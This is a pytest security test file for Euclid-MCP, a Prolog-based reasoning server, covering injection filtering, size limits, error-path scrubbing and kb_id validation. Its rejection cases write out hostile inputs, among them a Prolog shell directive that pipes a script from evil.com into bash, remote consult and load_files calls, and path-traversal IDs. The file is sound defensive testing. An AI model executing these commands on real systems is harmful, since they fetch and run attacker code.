"""Security tests for Euclid-MCP.

Tests injection prevention, DoS limits, and error sanitization.
"""

import pytest

from euclid_mcp.language import parse
from euclid_mcp.prolog_bridge import _sanitize_error
from euclid_mcp.sanitizer import sanitize
from euclid_mcp.server import (
    MAX_DEPTH_LIMIT,
    MAX_KNOWLEDGE_LENGTH,
    MAX_QUERY_LENGTH,
    MAX_SOLUTIONS_LIMIT,
    reason,
    register_kb,
    unregister_kb,
)

# =============================================================================
# Phase 1: Input sanitization tests
# =============================================================================

class TestPrologDirectiveInjection:
    """Reject Prolog directives that could execute arbitrary commands."""

    def test_reject_shell_directive(self):
        with pytest.raises(ValueError, match="Rejected dangerous pattern"):
            sanitize(":- shell('id').")

    def test_reject_shell_in_fact(self):
        with pytest.raises(ValueError, match="Rejected dangerous pattern"):
            sanitize(":- shell('curl http://evil.com/shell.sh | bash').")

    def test_reject_halt_directive(self):
        with pytest.raises(ValueError, match="Rejected dangerous pattern"):
            sanitize(":- halt.")

    def test_reject_consult_directive(self):
        with pytest.raises(ValueError, match="Rejected dangerous pattern"):
            sanitize(":- consult('http://evil.com/malicious.pl').")

    def test_reject_assert_directive(self):
        with pytest.raises(ValueError, match="Rejected dangerous pattern"):
            sanitize(":- assert(shell('id')).")

    def test_reject_retract_directive(self):
        with pytest.raises(ValueError, match="Rejected dangerous pattern"):
            sanitize(":- retractall(user(_)).")

    def test_reject_process_create(self):
        with pytest.raises(ValueError, match="Rejected dangerous pattern"):
            sanitize(":- process_create(path(sh), ['-c', 'id'], []).")

    def test_reject_set_prolog_flag(self):
        with pytest.raises(ValueError, match="Rejected dangerous pattern"):
            sanitize(":- set_prolog_flag(unknown, fail).")

    def test_reject_load_files(self):
        with pytest.raises(ValueError, match="Rejected dangerous pattern"):
            sanitize(":- load_files('http://evil.com/x.pl').")

    def test_reject_rule_with_shell(self):
        with pytest.raises(ValueError, match="Rejected dangerous pattern"):
            sanitize("evil(X) :- shell(X)")

    def test_reject_shell_in_body(self):
        with pytest.raises(ValueError, match="Rejected dangerous pattern"):
            sanitize("p(X) IF shell(X)")

    def test_reject_halt_in_query(self):
        with pytest.raises(ValueError, match="Rejected dangerous pattern"):
            sanitize("? halt.")

    def test_reject_case_insensitive(self):
        with pytest.raises(ValueError, match="Rejected dangerous pattern"):
            sanitize(":- SHELL('id').")

    def test_reject_shell_with_space(self):
        with pytest.raises(ValueError, match="Rejected dangerous pattern"):
            sanitize(":- shell ('id').")

    def test_allow_valid_euclid_ir(self):
        """Valid Euclid-IR should pass without error."""
        sanitize("""
parent(tom, bob)
parent(bob, ann)
ancestor($x, $y) IF parent($x, $y)
ancestor($x, $y) IF parent($x, $z) AND ancestor($z, $y)
? ancestor(tom, $who)
""")

    def test_allow_not_keyword(self):
        """NOT is a valid Euclid-IR keyword, not a dangerous pattern."""
        sanitize("blocked($user) IF NOT active($user)")

    def test_allow_arithmetic(self):
        """Arithmetic comparisons are valid Euclid-IR."""
        sanitize("stale($user) IF last_login($user, $days) AND $days > 90")

    def test_allow_comments_with_colon_slash(self):
        """Comments containing :// should not trigger false positives."""
        sanitize("# see http://example.com for docs\nparent(tom, bob)")

    def test_reject_euclid_rule_id(self):
        """The reserved internal marker euclid_rule_id is blocked."""
        with pytest.raises(ValueError, match="Rejected dangerous pattern"):
            sanitize("p(x)\neuclid_rule_id('spoof')\n? p($x)")

    def test_allow_rule_id_comment(self):
        """The # rule: comment is a valid Euclid-IR feature, not dangerous."""
        sanitize("p(a)\nq($x) IF p($x)  # rule: RBAC-0043")

    def test_allow_dangerous_tokens_inside_strings(self):
        """Tokens that match blacklist words inside string literals are inert
        data, not calls: no false positives."""
        sanitize('note(alice, "write a review")')
        sanitize('user(open_ai)')
        sanitize('description(bob, "uses use_module for tutorials")')
        sanitize("p('consult me')")

    def test_reject_dangerous_token_outside_string(self):
        """Blacklist words still rejected when they are actual calls."""
        with pytest.raises(ValueError, match="Rejected dangerous pattern"):
            sanitize('p("x"), shell(y)')
        with pytest.raises(ValueError, match="Rejected dangerous pattern"):
            sanitize("p(use_module(library(foo)))")


class TestInjectionViaParse:
    """Ensure injection is caught at the parse level."""

    def test_parse_rejects_directive(self):
        with pytest.raises(ValueError):
            parse(":- shell('id')\n? true")

    def test_parse_rejects_yaml_injection(self):
        with pytest.raises(ValueError):
            parse('facts:\n  - ":- shell(\'id\')"\nquery: "true"')


# =============================================================================
# Phase 2: Hard limits tests
# =============================================================================

class TestKnowledgeLengthLimit:
    """Ensure oversized knowledge is rejected."""

    def test_reject_oversized_knowledge(self):
        huge = "p(x" + "a" * (MAX_KNOWLEDGE_LENGTH + 1000) + ")\n? p($x)"
        result = reason(knowledge=huge)
        assert result.error is not None
        assert "exceeds maximum" in result.error

    def test_accept_large_but_valid_knowledge(self):
        """A large knowledge base within limits should be accepted."""
        facts = "\n".join(f"f{i}(v{i})" for i in range(1000))
        kb = facts + "\n? f0($x)"
        result = reason(knowledge=kb)
        # Should not fail on size validation (may fail on other reasons)
        assert "exceeds maximum" not in (result.error or "")


class TestMaxDepthLimits:
    """Ensure max_depth is bounded."""

    def test_max_depth_hard_capped(self):
        """max_depth above limit should be rejected by Pydantic."""
        # Pydantic Field(le=MAX_DEPTH_LIMIT) should reject this
        result = reason(
            knowledge="p(a)\n? p($x)",
            max_depth=MAX_DEPTH_LIMIT + 1,
        )
        # Pydantic validation error should produce an error
        assert result.error is not None


class TestMaxSolutionsLimits:
    """Ensure max_solutions is bounded."""

    def test_max_solutions_hard_capped(self):
        """max_solutions above limit should be rejected by Pydantic."""
        result = reason(
            knowledge="p(a)\n? p($x)",
            max_solutions=MAX_SOLUTIONS_LIMIT + 1,
        )
        assert result.error is not None

    def test_max_solutions_capped_in_engine(self):
        """A query with more than N solutions returns exactly N: the cap is
        enforced in the Prolog snippet, not only by the Python-side slice."""
        facts = "\n".join(f"item({i})" for i in range(50))
        result = reason(knowledge=facts + "\n? item($x)", max_solutions=3)
        assert result.error is None
        assert len(result.solutions) == 3


class TestQueryLengthLimit:
    """Ensure the query parameter is length-capped."""

    def test_reject_oversized_query(self):
        huge = "p(" + "a" * (MAX_QUERY_LENGTH + 1) + ")"
        result = reason(knowledge="p(x)\n? p($x)", query=huge)
        assert result.error is not None
        assert "exceeds maximum" in result.error

    def test_reject_dangerous_query(self):
        """The query parameter goes through the sanitizer too."""
        result = reason(knowledge="p(x)\n? p($x)", query=":- shell('id')")
        assert result.error is not None
        assert "dangerous" in result.error


# =============================================================================
# Phase 3: Error sanitization tests
# =============================================================================

class TestErrorSanitization:
    """Ensure internal paths are not leaked in error messages."""

    def test_sanitize_temp_path(self):
        msg = "ERROR: /tmp/tmpAbC12345.pl:5: Syntax error: ..."
        clean = _sanitize_error(msg)
        assert "/tmp/" not in clean
        assert "<input>:" in clean

    def test_sanitize_multiple_paths(self):
        msg = "ERROR: /tmp/tmpABC.pl:10: and /tmp/tmpXYZ.pl:20: ..."
        clean = _sanitize_error(msg)
        assert "/tmp/" not in clean

    def test_sanitize_no_path(self):
        msg = "Some normal error message"
        clean = _sanitize_error(msg)
        assert clean == msg

    def test_error_in_reason_does_not_leak_path(self):
        """A failing Prolog query should not expose temp file paths."""
        result = reason(
            knowledge="p(a)\n? q($x)",  # q is undefined
        )
        if result.error:
            assert "/tmp/" not in result.error
            assert ".pl:" not in result.error


# =============================================================================
# Phase 4: Named KB (C3) — kb_id / delta_knowledge injection
# =============================================================================

_VALID_KB = "p(a)\n? p($x)"


class TestKbIdInjection:
    """kb_id must match the allowlist [a-z0-9_-]{1,64}; no path/name tricks."""

    @pytest.mark.parametrize("kb_id", [
        "../admin",
        "admin/evil",
        "../",
        "a b",
        "Admin",
        "A",  # uppercase rejected
        "x" * 65,
        "",
        None,
    ])
    def test_register_kb_rejects_invalid_ids(self, kb_id):
        result = register_kb(kb_id, _VALID_KB)
        assert result["registered"] is False
        assert result["error"] is not None

    def test_register_kb_accepts_benign_reserved_sounding_id(self):
        result = register_kb("admin", _VALID_KB)
        assert result["registered"] is True
        assert unregister_kb("admin")["removed"] is True

    def test_reason_rejects_invalid_kb_id(self):
        result = reason(knowledge=None, kb_id="../admin", query="p($x)")
        assert result.error is not None
        assert "Invalid kb_id" in result.error

    def test_reason_unknown_kb_id(self):
        result = reason(knowledge=None, kb_id="does-not-exist", query="p($x)")
        assert result.error is not None
        assert "Unknown kb_id" in result.error

    def test_reason_rejects_oversized_kb_id(self):
        result = reason(knowledge=None, kb_id="a" * 65, query="p($x)")
        assert result.error is not None
        assert "Invalid kb_id" in result.error


class TestDeltaKnowledgeLimits:
    def test_reason_rejects_oversized_delta(self):
        register_kb("rbac-limit", _VALID_KB)
        try:
            result = reason(
                kb_id="rbac-limit",
                delta_knowledge="p(a" + "a" * (MAX_KNOWLEDGE_LENGTH + 1000) + ")",
                query="p($x)",
            )
            assert result.error is not None
            assert "delta_knowledge exceeds maximum" in result.error
        finally:
            unregister_kb("rbac-limit")

    def test_reason_rejects_delta_without_kb_id(self):
        result = reason(knowledge=None, delta_knowledge="p(a)", query="p($x)")
        assert result.error is not None
        assert "delta_knowledge requires a kb_id" in result.error

    def test_register_kb_rejects_oversized_knowledge(self):
        huge = "p(a" + "a" * (MAX_KNOWLEDGE_LENGTH + 1000) + ")"
        result = register_kb("big", huge)
        assert result["registered"] is False
        assert "exceeds maximum" in result["error"]

    def test_register_kb_rejects_invalid_kb(self):
        result = register_kb("broken", "mortal($x) IF ghost($x)")
        assert result["registered"] is False
        assert "not valid" in result["error"]

    def test_register_kb_rejects_empty_knowledge(self):
        result = register_kb("empty", "   ")
        assert result["registered"] is False
        assert "knowledge" in result["error"]
